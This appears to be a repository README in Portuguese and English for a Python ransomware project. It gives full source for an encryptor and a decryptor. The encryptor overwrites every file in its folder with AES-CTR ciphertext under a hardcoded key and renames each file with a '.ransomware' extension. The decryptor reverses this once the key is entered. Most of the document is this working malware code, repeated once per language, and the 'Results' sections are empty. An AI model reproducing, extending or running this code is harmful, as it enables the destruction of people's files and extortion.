# Projeto em Python de um Ransomware (PT-BR)

### Funcionamento

- O intuito deste projeto é criar um Ransomware que criptografe arquivos presentes na pasta onde o Malware está.

- Este Ransomware é dividido em dois executaveis, um deles terá a função de criptografar os arquivos e o outro terá o objetivo de descriptografa-los futuramente.

### Código de Criptografia

- O executavel abre todos os arquivos presentes na pasta onde ele se encontra, verificando se já não estão criptografados ou se não são os próprios executaveis.

- Após abrir cada arquivo presente na pasta ele copia os dados e os criptografa, reescrevendo em seguida o arquivo. Ele também substitui a estenção do arquivo para ".ransomware".

```python
import os
import pyaes

for name in os.listdir("./"):
    if name != "decrypt.py" and name != "encrypt.py":
        with open(name, "rb") as file:
            file_data = file.read()

        key = b"secretencryptkey"
        aes = pyaes.AESModeOfOperationCTR(key)

        data_encrypt = aes.encrypt(file_data)

        with open(name, "wb") as file:
            file.write(data_encrypt)

        os.rename("./{}".format(name), "./{}.ransomware".format(name))
```

- A chave de criptografia utilizada foi "secretencryptkey", essa chave será utilizada futuramente durante a descriptografia.

### Código de Descriptografia

- Para que o processo se inicie, o executavel exige que o usuário digite a mesma chave de criptografia que foi utilizada para criptografar os arquivos anteriormente. Se digitado corretamente, o processo se inicia, caso contrário, ele apenas retorna a mensagem "Wrong Key!" para o usuário.

- Após a chave de criptografia ser informada corretamente, o executável abre todos os arquivos presentes na pasta, verificando não são os próprios executáveis e se contém a extensão ".ransomware". Com isso, apenas os arquivos que já haviam sido criptografados serão abertos.

- Para cada arquivo aberto, o executável copia dos dados, os descriptografa e reescreve o arquivo. Para finalizar, ele exclui a extensão ".ransomware". Fazendo com que o arquivo volte a seu estado original descriptografado.

```python
import os
import pyaes

secret = input("What the secret key?")

if secret == "secretencryptkey":
    for name in os.listdir("./"):
        if name != "decrypt.py" and name != "encrypt.py" and name.split(".")[-1] == "ransomware":
            with open(name, "rb") as file:
                file_data = file.read()

                key = secret.encode()
                aes = pyaes.AESModeOfOperationCTR(key)

                data_decrypt = aes.decrypt(file_data)

                with open(name, "wb") as file:
                    file.write(data_decrypt)

                list = name.split(".")
                new_name = "{}.{}".format(list[0],list[1])
                os.rename("./{}".format(name), "./{}".format(new_name))
else:
    print("Wrong Decrypt Key!")
```

### Resultados

- 

# Ransomware Project in Python (EN-US)

### Functionality

- The purpose of this project is to create a Ransomware that encrypts files present in the folder where the Malware is.

- This Ransomware is divided into two executables, one of which will have the function of encrypting the files and the other will have the purpose of decrypting them in the future.

### Encryption Code

- The executable opens all the files in the folder where it is located, checking whether they are already encrypted or whether they are not the executables themselves.

- After opening each file in the folder, it copies the data and encrypts it and then rewrites the file. It also replaces the file extension with ".ransomware".

```python
import os
import pyaes

for name in os.listdir("./"):
    if name != "decrypt.py" and name != "encrypt.py":
        with open(name, "rb") as file:
            file_data = file.read()

        key = b"secretencryptkey"
        aes = pyaes.AESModeOfOperationCTR(key)

        data_encrypt = aes.encrypt(file_data)

        with open(name, "wb") as file:
            file.write(data_encrypt)

        os.rename("./{}".format(name), "./{}.ransomware".format(name))
```

- The encryption key used was "secretencryptkey", this key will be used later during decryption.

### Decryption Code

- For the process to start, the executable requires the user to enter the same encryption key that was used to encrypt the files previously. If entered correctly, the process starts, otherwise, it simply returns the message "Wrong Key!" to the user.

- After the encryption key is entered correctly, the executable opens all files in the folder, checking if they are not the executables themselves and if they contain the ".ransomware" extension. This means that only files that had already been encrypted will be opened.

- For each file opened, the executable copies the data, decrypts it, and rewrites the file. Finally, it deletes the ".ransomware" extension. This returns the file to its original decrypted state.

```python
import os
import pyaes

secret = input("What the secret key?")

if secret == "secretencryptkey":
    for name in os.listdir("./"):
        if name != "decrypt.py" and name != "encrypt.py" and name.split(".")[-1] == "ransomware":
            with open(name, "rb") as file:
                file_data = file.read()

                key = secret.encode()
                aes = pyaes.AESModeOfOperationCTR(key)

                data_decrypt = aes.decrypt(file_data)

                with open(name, "wb") as file:
                    file.write(data_decrypt)

                list = name.split(".")
                new_name = "{}.{}".format(list[0],list[1])
                os.rename("./{}".format(name), "./{}".format(new_name))
else:
    print("Wrong Decrypt Key!")
```

### Results

- 
